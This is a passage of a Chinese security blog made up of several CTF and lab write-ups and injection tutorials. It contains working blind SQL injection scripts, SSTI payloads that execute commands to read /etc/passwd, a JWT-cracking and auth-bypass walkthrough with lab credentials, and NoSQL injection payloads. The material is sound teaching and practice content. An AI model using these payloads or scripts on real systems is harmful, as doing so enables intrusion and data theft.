class=\"line\">    exit();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$tmpfname = tempnam(&quot;/tmp/smarty/templates&quot;, &quot;FOO&quot;);</span><br><span class=\"line\">$handle = fopen($tmpfname, &quot;w&quot;);</span><br><span class=\"line\">fwrite($handle, $_POST[&#x27;data&#x27;]);</span><br><span class=\"line\">fclose($handle);</span><br><span class=\"line\">$just_file = end(explode(&#x27;/&#x27;,$tmpfname));</span><br><span class=\"line\">$smarty-&gt;display($just_file);</span><br><span class=\"line\">unlink($tmpfname);</span><br></pre></td></tr></table></figure>\n\n<p>用换行符绕过即可</p>\n<h2 id=\"Bug-Report-Repo\"><a href=\"#Bug-Report-Repo\" class=\"headerlink\" title=\"Bug Report Repo\"></a>Bug Report Repo</h2><p>首先是sql盲注，数据库是<code>sqlite</code>，自己写的脚本，效率不够，还是得靠sqlmap</p>\n<figure class=\"highlight py\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> websocket</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"><span class=\"built_in\">str</span>=string.ascii_letters+string.digits+string.punctuation</span><br><span class=\"line\">ws = websocket.WebSocket()</span><br><span class=\"line\">ws.connect(<span class=\"string\">&quot;wss://bountyrepo.ctf.intigriti.io/ws&quot;</span>)</span><br><span class=\"line\">flag=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">300</span>):</span><br><span class=\"line\">    aaa=<span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>:</span><br><span class=\"line\">        <span class=\"comment\"># data=&#123;&quot;id&quot;:f&quot;11 and length(sqlite_version())=&#123;j&#125;&quot;&#125;判断数据库长度</span></span><br><span class=\"line\">        <span class=\"comment\"># data=&#123;&quot;id&quot;:f&quot;11 AND SUBSTR((SELECT COUNT(tbl_name) FROM sqlite_master WHERE type=&#x27;table&#x27;),1,1)=CHAR(&#123;j&#125;)&quot;&#125;判断表长度</span></span><br><span class=\"line\">        <span class=\"comment\">#data=&#123;&quot;id&quot;:f&quot;11 and substr((select group_concat(tbl_name) from sqlite_master where type=&#x27;table&#x27; limit 0,1),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;&quot;&#125;</span></span><br><span class=\"line\">        data = &#123;<span class=\"string\">&quot;id&quot;</span>: <span class=\"string\">f&quot;11 and substr((select group_concat(sql) from sqlite_master),<span class=\"subst\">&#123;j&#125;</span>,1)=&#x27;<span class=\"subst\">&#123;i&#125;</span>&#x27;&quot;</span>&#125;</span><br><span class=\"line\">        data=json.dumps(data)</span><br><span class=\"line\">        <span class=\"comment\">#print(data)</span></span><br><span class=\"line\">        ws.send(data)</span><br><span class=\"line\">        a=ws.recv()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(a)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;Bug report from ethical_hacker is Open&#x27;</span> <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">            aaa=<span class=\"literal\">True</span></span><br><span class=\"line\">            flag+=i</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"comment\">#continue</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> aaa == <span class=\"literal\">False</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;ok&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>附一个别的师傅写的脚本</p>\n<figure class=\"highlight py\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">from</span> websockets.sync.client <span class=\"keyword\">import</span> connect</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">URL = <span class=\"string\">&#x27;bountyrepo.ctf.intigriti.io&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># ALPHABET = string.ascii_uppercase # string.ascii_letters + &#x27;&#123;!_&#125;&#x27;</span></span><br><span class=\"line\">ALPHABET = string.digits + <span class=\"string\">&#x27;.&#x27;</span></span><br><span class=\"line\">PAYLOAD = <span class=\"string\">&quot;1 AND (select sqlite_version()) LIKE &#x27;&#123;guess&#125;%&#x27; -- -&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># flag = &#x27;INTIGRITI&#x27; </span></span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span> </span><br><span class=\"line\"><span class=\"keyword\">with</span> connect(<span class=\"string\">f&quot;wss://<span class=\"subst\">&#123;URL&#125;</span>/ws&quot;</span>) <span class=\"keyword\">as</span> websocket:</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> ALPHABET:</span><br><span class=\"line\">            payload = PAYLOAD.<span class=\"built_in\">format</span>(guess=flag + c)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\r&gt;&gt;&gt;&#x27;</span>, payload, end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">            websocket.send(json.dumps(&#123;<span class=\"string\">&quot;id&quot;</span>: payload&#125;))</span><br><span class=\"line\">            message = websocket.recv()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&#x27;Bug not found!&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> message:</span><br><span class=\"line\">                flag += c</span><br><span class=\"line\">                <span class=\"built_in\">print</span>()</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\"># PAYLOAD = &quot;1 AND (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type=&#x27;table&#x27; and tbl_name NOT like &#x27;sqlite_%&#x27;) LIKE &#x27;&#123;tables&#125;%&#x27; -- -&quot;</span></span><br><span class=\"line\"><span class=\"string\"># tables = &quot;bug_reports&quot;</span></span><br><span class=\"line\"><span class=\"string\"># PAYLOAD = &quot;1 AND (SELECT GROUP_CONCAT(name) FROM PRAGMA_TABLE_INFO(&#x27;bug_reports&#x27;)) LIKE &#x27;&#123;guess&#125;%&#x27; --&quot;</span></span><br><span class=\"line\"><span class=\"string\"># columns = &#x27;id,category,description,severity,cvss_score,status,reported_by,reported_date&#x27;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>爆出来的一条有用的东西</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">crypt0:c4tz on /4dm1n_z0n3, really?!</span><br></pre></td></tr></table></figure>\n\n<p>访问是一个登录页面，用给的用户名密码登录，他是得是admin，那就是jwt，但是不知道密钥啊，这个时候就用到了一个工具<code>jwt-cracker</code>爆破密钥，字典用<code>rockyou</code>，key是<code>catsarethebest</code>，伪造admin就ok了</p>\n<h2 id=\"Pizza-Time\"><a href=\"#Pizza-Time\" class=\"headerlink\" title=\"Pizza Time\"></a>Pizza Time</h2><p>只有一处功能点….</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo nmap -sVC -T4 -Pn -vv -p 443 pizzatime.ctf.intigriti.io</span><br></pre></td></tr></table></figure>\n\n<p>探测web服务，用的是ngnix，可以猜测是<code>Flask/Django</code>或者<code>node</code></p>\n<p>首先fuzz，可以看出除了<code>&amp;</code>和<code>+</code>的所有的特殊字符都被过滤了大括号也被过滤了，难道不是<code>SSTI</code>么？不！他就是SSTI,<code>%0a</code>可以绕过，具体原理是什么我得分析分析源码再写</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">x%0a&#123;&#123;lipsum.__globals__[&quot;os&quot;].popen(&#x27;cat+/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>但是这样会报500，将命令放进header里就可以绕过了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">x%0a&#123;&#123;lipsum.__globals__[&quot;os&quot;].popen(request.headers.get(&quot;X&quot;)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n","categories":["ctf","复盘"],"tags":["ctf"]},{"title":"Tiki:1","url":"/2023/12/04/Tiki-1/","content":"<h1 id=\"描述\"><a href=\"#描述\" class=\"headerlink\" title=\"描述\"></a>描述</h1><p>哦，不，我们的网络服务器受到了损害。攻击者使用了0day，所以我们不知道他是如何进入管理面板的。调查一下。</p>\n<p>这是一个 OSCP Prep Box，它基于我最近发现的 CVE。它位于 OSCP 实验室机器级别。</p>\n<h1 id=\"渗透过程\"><a href=\"#渗透过程\" class=\"headerlink\" title=\"渗透过程\"></a>渗透过程</h1><p>首先就是信息搜集，靶机的ip用nmap或者netdiscover都可以</p>\n<p>靶机ip：192.168.56.102</p>\n<p>然后扫描一下全部的端口</p>\n<p><code>nmap -sS -p- 192.168.56.102 -T4 --min-rate 1000 -oN nmap.txt</code></p>\n<p>结果如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PORT    STATE SERVICE</span><br><span class=\"line\">22/tcp  open  ssh</span><br><span class=\"line\">80/tcp  open  http</span><br><span class=\"line\">139/tcp open  netbios-ssn</span><br><span class=\"line\">445/tcp open  microsoft-ds</span><br></pre></td></tr></table></figure>\n\n<p>然后扫一下端口的信息，和服务的版本</p>\n<p><code>nmap -sV -sC -O -p22,80,139,445 192.168.56.102 </code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PORT    STATE SERVICE     VERSION</span><br><span class=\"line\">22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class=\"line\">| ssh-hostkey: </span><br><span class=\"line\">|   3072 a3d84a89a9256d07c53d762806edd1c0 (RSA)</span><br><span class=\"line\">|   256 e7b289055457dc02f48c3a7c558b51aa (ECDSA)</span><br><span class=\"line\">|_  256 fd77072b4a163a016be0000c0a36d82f (ED25519)</span><br><span class=\"line\">80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))</span><br><span class=\"line\">| http-robots.txt: 1 disallowed entry </span><br><span class=\"line\">|_/tiki/</span><br><span class=\"line\">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class=\"line\">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class=\"line\">139/tcp open  netbios-ssn Samba smbd 4.6.2</span><br><span class=\"line\">445/tcp open  netbios-ssn Samba smbd 4.6.2</span><br><span class=\"line\">MAC Address: 08:00:27:26:96:01 (Oracle VirtualBox virtual NIC)</span><br><span class=\"line\">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class=\"line\">Device type: general purpose</span><br><span class=\"line\">Running: Linux 4.X|5.X</span><br><span class=\"line\">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class=\"line\">OS details: Linux 4.15 - 5.6</span><br><span class=\"line\">Network Distance: 1 hop</span><br><span class=\"line\">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class=\"line\"></span><br><span class=\"line\">Host script results:</span><br><span class=\"line\">|_clock-skew: 7h59m57s</span><br><span class=\"line\">| smb2-security-mode: </span><br><span class=\"line\">|   311: </span><br><span class=\"line\">|_    Message signing enabled but not required</span><br><span class=\"line\">|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)</span><br><span class=\"line\">| smb2-time: </span><br><span class=\"line\">|   date: 2023-12-04T20:55:56</span><br><span class=\"line\">|_  start_date: N/A</span><br><span class=\"line\"></span><br><span class=\"line\">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 28.95 seconds</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>可以发现有<code>samba</code>服务，可以对samba进行枚举</p>\n<p>用<code>enum4linux</code>跑一下可以找到<code>silky</code>的用户,用smbclient列举一下共享的资源</p>\n<p><code>smbclient -L IP</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Sharename       Type      Comment</span><br><span class=\"line\">---------       ----      -------</span><br><span class=\"line\">print$          Disk      Printer Drivers</span><br><span class=\"line\">Notes           Disk      My Notes</span><br><span class=\"line\">IPC$            IPC       IPC Service (ubuntu server (Samba, Ubuntu))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>能找到Notes，连接一下<code>smbclient //192.168.56.102/Notes</code>有一个Mail.txt</p>\n<p>下载下来查看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#Mail.txt</span><br><span class=\"line\">Hi Silky</span><br><span class=\"line\">because of a current Breach we had to change all Passwords,</span><br><span class=\"line\">please note that it was a 0day, we don&#x27;t know how he made it.</span><br><span class=\"line\"></span><br><span class=\"line\">Your new CMS-password is now 51lky571k1, </span><br><span class=\"line\">please investigate how he made it into our Admin Panel.</span><br><span class=\"line\"></span><br><span class=\"line\">Cheers Boss.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>可以看到cms的密码，登录之后没什么用。</p>\n<p>查看cms有没有什么历史漏洞</p>\n<p><code>searchsploit tiki cms</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class=\"line\"> Exploit Title                                                                                                                                            |  Path</span><br><span class=\"line\">---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class=\"line\">Tiki Wiki CMS 15.0 - Arbitrary File Download                                                                                                              | php/webapps/40080.txt</span><br><span class=\"line\">Tiki Wiki CMS Calendar 6.15/9.11 LTS/12.5 LTS/14.2 - Remote Code Execution                                                                                | php/webapps/39965.txt</span><br><span class=\"line\">Tiki Wiki CMS Groupware - &#x27;url&#x27; Open Redirection                                                                                                          | php/webapps/36848.txt</span><br><span class=\"line\">Tiki Wiki CMS Groupware 21.1 - Authentication Bypass                                                                                                      | php/webapps/48927.py</span><br><span class=\"line\">Tiki Wiki CMS Groupware 5.2 - Multiple Vulnerabilities                                                                                                    | php/webapps/15174.txt</span><br><span class=\"line\">Tiki Wiki CMS Groupware 7.2 - &#x27;snarf_ajax.php&#x27; Cross-Site Scripting                                                                                       | php/webapps/35974.txt</span><br><span class=\"line\">Tiki Wiki CMS Groupware 8.1 - &#x27;show_errors&#x27; HTML Injection                                                                                                | php/webapps/36470.txt</span><br><span class=\"line\">Tiki Wiki CMS Groupware 8.2 - &#x27;snarf_ajax.php&#x27; Remote PHP Code Injection                                                                                  | php/webapps/18265.txt</span><br><span class=\"line\">Tiki Wiki CMS Groupware 8.3 - &#x27;Unserialize()&#x27; PHP Code Execution                                                                                          | php/webapps/19573.php</span><br><span class=\"line\">Tiki Wiki CMS Groupware 8.3 - &#x27;Unserialize()&#x27; PHP Code Execution (Metasploit)                                                                             | php/webapps/19630.rb</span><br><span class=\"line\">---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class=\"line\">Shellcodes: No Results</span><br><span class=\"line\">Papers: No Results</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>查看web服务cms的版本用dirsearch可以找到一个changelog</p>\n<p>访问可以看到版本为21.1，正好有一个历史漏洞</p>\n<p>用<code>searchsploit tiki cms -m 48927 </code>将脚本下载下来运行，重置admin的密码为空,然后用admin登录bp抓包修改登录密码为空，成功登录。在lastchange的Credentials里可以找到<code>silky:Agy8Y7SPJNXQzqA </code>这个是ssh的密码，用ssh连接，查看id，发现用户在sodu组下，可以直接sudo su提权。</p>\n<h1 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h1><p>一开始靶场搭建的时候出了点问题导致发现不了靶机的地址，是因为我的攻击机和靶机不在一个局域网内，将靶机的网卡和攻击机桥接在一起就可以了</p>\n<p>记录下来的只有正确的路线，渗透过程中还要去试着探索其他的功能点</p>\n","categories":["boot2root"],"tags":["vulnhub"]},{"title":"order by 盲注","url":"/2024/02/11/order-by-%E7%9B%B2%E6%B3%A8/","content":"<h1 id=\"order-by比较大小盲注\"><a href=\"#order-by比较大小盲注\" class=\"headerlink\" title=\"order by比较大小盲注\"></a>order by比较大小盲注</h1><p><img src=\"/pic/orderby1.png\"></p>\n<p>这是表里的所有东西</p>\n<p>如果我们执行<code>select * from flag where id=&#39;&#39; or 1 union select 1,1 order by 2;</code>会出现</p>\n<p><img src=\"/pic/orderby2.png\"></p>\n<p>不能用<code>and</code>否则就相当于创建了一个虚拟的表，查询不到原来的数据。</p>\n<p>我们知道flag的第一位是<code>f</code>，如果我们查询<code>select * from flag where id=&#39;&#39; or 1 union select 1,&#39;f&#39; order by 2;</code>会发生什么呢？</p>\n<p><img src=\"/pic/orderby3.png\"></p>\n<p>还是这样，第一行没什么用，但是如果我们查询的是<code>g</code>的话就会变成这样</p>\n<p><img src=\"/pic/orderby4.png\"></p>\n<p>flag的值就会出现在第一行，我们就可以利用这一点来进行order by盲注</p>\n<p>脚本:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">url=<span class=\"string\">&quot;http://4ef0329e-10b4-4bd1-bf0a-0d80fe83129d.challenge.ctf.show/&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">str</span>=string.digits+string.ascii_letters</span><br><span class=\"line\">flag=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">j=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">50</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>:</span><br><span class=\"line\">        data = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;username&#x27;</span>: <span class=\"string\">&quot;&#x27; or 1 union select 1,2,&#x27;&#123;0&#125;&#x27; order by 3#&quot;</span>.<span class=\"built_in\">format</span>(flag+s),</span><br><span class=\"line\">            <span class=\"string\">&#x27;password&#x27;</span>: <span class=\"string\">&#x27;1111&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        r=requests.post(url,data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;&lt;/code&gt;admin&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            flag+=<span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(s)-<span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br></pre></td></tr></table></figure>\n\n<p>根据脚本自行修改</p>\n","categories":["web"],"tags":["web","sql"]},{"title":"sql异或注入","url":"/2024/03/01/sql%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5/","content":"<h2 id=\"sql异或注入\"><a href=\"#sql异或注入\" class=\"headerlink\" title=\"sql异或注入\"></a>sql异或注入</h2><p>当waf过滤了很多东西，但是没有过滤异或(^)符的时候使用。</p>\n<h3 id=\"什么是异或注入\"><a href=\"#什么是异或注入\" class=\"headerlink\" title=\"什么是异或注入\"></a>什么是异或注入</h3><p>异步注入说简单一点就是在构造where后面的判断条件时使用^（异或符号）来达到sql注入攻击的目的</p>\n<p><strong>1^1=0 1^0=1</strong></p>\n<p>异或注入就是利用sql语句来进行盲注</p>\n<p>例如：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * <span class=\"keyword\">from</span> student where <span class=\"title class_\">Sname</span>=<span class=\"number\">1</span>^(<span class=\"title function_\">substr</span>(<span class=\"title function_\">database</span>(),$变量<span class=\"number\">1</span>$,<span class=\"number\">1</span>)=$变量<span class=\"number\">2</span>$);</span><br></pre></td></tr></table></figure>\n\n<p>这里就是看数据库的第<code>变量1</code>个字符是否等于<code>变量2</code>，如果相等就会变成<code>1^1</code>返回的是0，所以我们应该在最后再异或一个1</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> student <span class=\"keyword\">where</span> Sname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"operator\">^</span>(substr(database(),$变量<span class=\"number\">1</span>$,<span class=\"number\">1</span>)<span class=\"operator\">=</span>$变量<span class=\"number\">2</span>$)<span class=\"operator\">^</span><span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n\n<p>这样如果数据库的第<code>变量1</code>个字符等于<code>变量2</code>就会返回1，然后再配合脚本实现异或注入</p>\n<hr>\n<p>脚本:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">url = &quot;&quot;</span><br><span class=\"line\">pay=&#x27;&#x27;</span><br><span class=\"line\">column = &quot;&quot;</span><br><span class=\"line\">for i in range(1, 1000):</span><br><span class=\"line\">    time.sleep(0.06)</span><br><span class=\"line\">    low = 32</span><br><span class=\"line\">    high = 128</span><br><span class=\"line\">    mid = (low + high) // 2</span><br><span class=\"line\">    while (low &lt; high):</span><br><span class=\"line\">        # 库名</span><br><span class=\"line\">        #temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot; % (i, mid)</span><br><span class=\"line\">        # 表名</span><br><span class=\"line\">        # temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)^1&quot; %(i,mid)</span><br><span class=\"line\">        # 字段名</span><br><span class=\"line\">        # temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot; %(i,mid)</span><br><span class=\"line\">        # 内容</span><br><span class=\"line\">        pay = &quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; %(i,mid)</span><br><span class=\"line\">        r = requests.get(url+pay)</span><br><span class=\"line\">        time.sleep(0.04)</span><br><span class=\"line\">        print(low, high, mid, &quot;:&quot;)</span><br><span class=\"line\">        if &quot;Click&quot; in r.text:\t\t\t#自行更改返回字符</span><br><span class=\"line\">            low = mid + 1</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            high = mid</span><br><span class=\"line\">        mid = (low + high) // 2</span><br><span class=\"line\">    if (mid == 32 or mid == 127):</span><br><span class=\"line\">        break</span><br><span class=\"line\">    column += chr(mid)</span><br><span class=\"line\">    print(column)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&quot;All:&quot;, column)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","categories":["web"],"tags":["web","sql"]},{"title":"PHP语法构造和变量函数","url":"/2024/02/29/PHP%E8%AF%AD%E6%B3%95%E6%9E%84%E9%80%A0%E5%92%8C%E5%8F%98%E9%87%8F%E5%87%BD%E6%95%B0/","content":"<p>昨天我发现了一个问题</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"string\">&#x27;693741&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"title function_ invoke__\">base_convert</span>(<span class=\"variable\">$a</span>,<span class=\"number\">10</span>,<span class=\"number\">36</span>);</span><br><span class=\"line\"><span class=\"variable\">$a</span>(<span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&quot;dir&quot;</span>));</span><br></pre></td></tr></table></figure>\n\n<p>$a是36进制的eval转换成的10进制</p>\n<p>所以这个代码其实就是<code>eval(system(&quot;dir&quot;));</code>，但是运行的时候却报错了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PHP Fatal error:  Uncaught Error: Call to undefined function eval()</span><br></pre></td></tr></table></figure>\n\n<p>然后去网上了解了才知道</p>\n<p><strong><code>eval</code> 属于PHP语法构造的一部分，并不是一个函数，所以不能通过 变量函数 的形式来调用`</strong></p>\n<p>类似的语法构造还有：<code>echo</code>，<code>print</code>，<code>unset()</code>，<code>isset()</code>，<code>empty()</code>，<code>include</code>，<code>require</code>…</p>\n<p>就比如</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">print &quot;asdasd&quot;;</span><br><span class=\"line\">&gt;asdasd</span><br><span class=\"line\"></span><br><span class=\"line\">function  myprint($a)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    print $a;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">myprint &quot;asdasdasd&quot;;</span><br><span class=\"line\">&gt;Parse error: syntax error, unexpected &#x27;&quot;asdasdasd&quot;&#x27; (T_CONSTANT_ENCAPSED_STRING)</span><br></pre></td></tr></table></figure>\n\n<p>直接<code>print &quot;asdasd&quot;</code>就可以打印出字符，但是自己构造的函数却没有办法这样。</p>\n<p>所以网上有的一句话木马来调用eval的其实都不可以,换成<code>assert</code>就可以了。</p>\n","categories":["web"],"tags":["web"]},{"title":"NoSQL注入","url":"/2024/03/12/NoSQL%E6%B3%A8%E5%85%A5/","content":"<h2 id=\"什么是NoSQL\"><a href=\"#什么是NoSQL\" class=\"headerlink\" title=\"什么是NoSQL\"></a>什么是NoSQL</h2><p>NoSQL，指的是非关系型的数据库。NoSQL 有时也称作 Not Only SQL 的缩写，是对不同于传统的<a href=\"https://cloud.tencent.com/product/cdb-overview?from_column=20065&from=20065\">关系型数据库</a>的<a href=\"https://cloud.tencent.com/product/dbbrain?from_column=20065&from=20065\">数据库管理</a>系统的统称。NoSQL 用于超大规模数据的存储。（例如谷歌或 Facebook 每天为他们的用户收集万亿比特的数据）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。</p>\n<hr>\n<p>NoSQL 提供了新的数据模型和查询格式，从而可以规避常规的 SQL 注入攻击。但是，它们也为攻击者提供了插入恶意代码的新方法。总的来讲有四种注入手法：</p>\n<p><strong>1、重言式</strong></p>\n<p>又称为永真式（这个好像是数理逻辑里面的术语），此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>\n<p><strong>2、联合查询</strong></p>\n<p>联合查询是一种众所周知的SQL注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>\n<p><strong>3、JavaScript 注入</strong></p>\n<p>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，传递不干净的用户输入到这些查询中可以注入任意 JavaScript 代码，导致非法的数据获取或篡改。</p>\n<p><strong>4、盲注</strong></p>\n<p>当页面没有回显时，那么我们可以通过<code>$regex</code>正则表达式来达到和 SQL 注入中<code>substr()</code>函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。</p>\n<hr>\n<p>对于 PHP 本身的特性而言，由于其松散的数组特性，导致如果我们输入<code>value=1</code>那么，也就是输入了一个 value 的值为 1 的数据。如果输入<code>value[$ne]=1</code>也就意味着<code>value=array($ne=&gt;1)</code>,在 MongoDB 中，原来的一个单个目标的查询变成了条件查询。同样的，我们也可以使用<code>username[$gt]=&amp;password[$gt]=</code>作为 payload 进行攻击。</p>\n<p>在我看来，nosql注入就是通过传入数组然后拼接恶意语句造成注入，和其他数据库的注入原理类似，但是语法有所不同。</p>\n<p><a 